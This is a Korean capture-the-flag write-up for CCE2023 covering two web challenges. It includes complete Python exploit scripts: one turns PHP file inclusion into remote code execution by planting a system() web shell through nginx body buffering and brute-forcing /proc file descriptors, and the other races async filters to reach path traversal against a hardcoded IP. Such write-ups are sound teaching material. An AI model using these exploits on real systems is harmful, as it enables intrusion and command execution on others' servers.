# CCE2023

## babyweb

---

```python
<?php
    $page = $_GET['page'];
    if(isset($page)){
        include("./data/".$page);
    } else {
        header("Location: /?page=1");
    }
?>
```

page 파라미터를 이용해서 LFI가 가능하다.

```python
# Copy From https://github.com/sajjadium/ctf-archives/blob/main/HXP/2021/web/counter/Dockerfile

FROM debian:bullseye

RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
    apt-get install -y \
        nginx \
        php-fpm \
        libzip-dev \
        php-zip \
    && rm -rf /var/lib/apt/lists/

RUN rm -rf /var/www/html/*
COPY config/default /etc/nginx/sites-enabled/default
COPY config/www.conf /etc/php/7.4/fpm/pool.d/www.conf

COPY flag.txt config/readflag /
RUN chown 0:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

COPY src /var/www/html/

RUN ln -sf /dev/stdout /var/log/nginx/access.log && \
    ln -sf /dev/stderr /var/log/nginx/error.log

RUN find / -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename /readflag -delete
USER www-data
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
USER root

EXPOSE 80
CMD /etc/init.d/php7.4-fpm start && \
    nginx -g 'daemon off;'
```

Dockerfile을 보면 `/readflag` 가 최상위 디렉토리에 존재한다.

![Untitled](writeup%202a6a0352afbf4628aae2573636fcb08f/Untitled.png)

`?page=../../../../../readflag`에 접근하면 readflag 파일을 읽을 수 있다.

ELF 바이너리라는 것을 알 수 있으며, 읽는 것이 아니라 실행하는 것이 문제의 목표다. 즉, RCE를 수행해야한다.

PHP LFI to RCE 라는 키워드로 조사하던 중 다음과 같은 글을 찾을 수 있었다.

[0xbb - PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

글 내용은 다음과 같다.

Nginx는 클라이언트 본문 버퍼링 기능을 제공하는데, 이 기능은 클라이언트 본문(post에만 국한되지 않음)이 특정 임계값보다 큰 경우 임시 파일을 생성한다고 한다.

이를 이용하여 공격을 진행하는데, 클라이언트 본문(body)을 크게 업로드해서 Nginx가 `/var/lib/nginx/body/$X`와 같은 경로에 웹쉘을 생성하도록 한다.

다음으로 Nginx 관련 작업 수행하는 `pid`를 모두 추출하고 procfs를 통해 Nginx의 fd를 무차별 대입(brute force)해서 body 파일을 include한다.

마지막으로 `../../`를 사용하여 include의 readlink 및 stat 문제를 우회한다.

### exploit

```python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes 
r  = requests.get(URL, params={
    'page': '../../../../../../../proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'page': '../../../../../../../proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'page': f'../../../../../../../proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`

def save_string_to_file(string, filename):
    with open(filename, 'w') as file:
        file.write(string)
        
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../../../../../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'page': f,
                'c': f'/readflag'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                save_string_to_file(r.text, "flag.txt")
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```

`webshell` 업로드와 `file include`를 동시에 `race condition`으로 수행하는 코드다. 임시파일이 삭제되기전에 해당 파일에 접근해서 RCE를 시도한다.

출력된 문자가 너무 긴 관계로 익스 결과를 파일로 저장해서 확인하는 방식으로 코드를 구성했다.

```python
cce2023{1e6b9e3691debe669ecd5626e7797ad4}
```

## baby file manager

---

```python
# util.py
from functools import wraps
import asyncio, aiofiles, copy, time, os
from aiofiles import os as aiofilesos

filters = '\\,|*?<>:"\'\n\r\t/\x00\x0b\x0c'

def runner(func):
    async def wrapper(*args, **kwargs):
        async with asyncio.timeout(1):
            if len(args) == 3:
                res = await func(args[0], args[1], args[2])
            elif len(args) == 2:
                res = await func(args[0], args[1])
        return res
    return wrapper

class FM:
    def __init__(self):
        self.filters = list(enumerate(filters))

    async def filtercheck(self, extfilter=False):
        self.filters = list(enumerate(filters))
        if extfilter == True:
            if self.ext and self.ext not in [".png", ".txt", ".jpg"]:
                return "Only png, txt, jpg file!!"
        print(id(self.filters))
        for i, x in self.filters:
            if x in self.filename:
                return "Filtered.."
            print(extfilter, i,x)
        return True
    
    @runner
    async def read(self, filename):
        self.filename, self.ext = os.path.splitext(filename)
        res = await self.filtercheck(True)
        if res == True:
            async with aiofiles.open("./uploads/{}".format(filename), mode='rb') as f:
                contents = await f.read()
                return [contents, self.ext]
        else:
            return res

    @runner
    async def write(self, filename, data):
        self.filename = filename
        res = await self.filtercheck()
        if res == True:
            async with aiofiles.open("./uploads/{}".format(filename), mode='wb') as f:
                await f.write(data)
                return "Write Success!!"
        else:
            return res

    @runner
    async def delete(self, filename):
        self.filename = filename
        res = await self.filtercheck()
        if res == True:
            await aiofilesos.remove("./uploads/{}".format(filename))
            return "Delete Success!!"
        else:
            return res
```

`read()`에서 필터링 체크는 `os.path.splitext()`로 `filename`을 분리한 `self.filename`으로 하는데, 파일을 오픈하고 읽는 것은 `filename`으로 한다.

마침 `util.py`에 선언된 함수들이 전부 `async(비동기)`로 처리하도록 선언됐고 레이스 컨디션을 시도할 수 있다.

레이스 컨디션이 트리거하기위해 `delete()`와 `read()`를 동시에 접근하여 필터링 체크 우회하는 동시에 LFI 수행하는 방식으로 공격을 진행했다.

### exploit

```python
#!/usr/bin/env python3

import requests
import threading
from urllib.parse import quote

# HOST = "http://192.168.35.222:31337/"
HOST = "http://20.214.140.79:31337/"

def read():
    url = HOST + "read"
    data = {
        "filename": "../../../../../flag"
    }

    resp = requests.post(url, data=data)
    if "Filtered.." not in resp.text:
        print (resp.text)

def write():
    url = HOST + "write"
    dummy = "a"*100
    resp = requests.post(url, files={"hashcode.png": dummy})
    print (resp.text)

def delete():
    url = HOST + "/delete"
    data = {
        "filename": "eins"
    }
    resp = requests.post(url, data=data)
    # print (resp.text)

# write()
# read()
# delete()

def run1():
    while True:
        delete()
def run2():
    while True:
        read()

for i in range(10):
    T = threading.Thread(target=run1, args=())
    T.start()

for i in range(10):
    T = threading.Thread(target=run2, args=())
    T.start()
```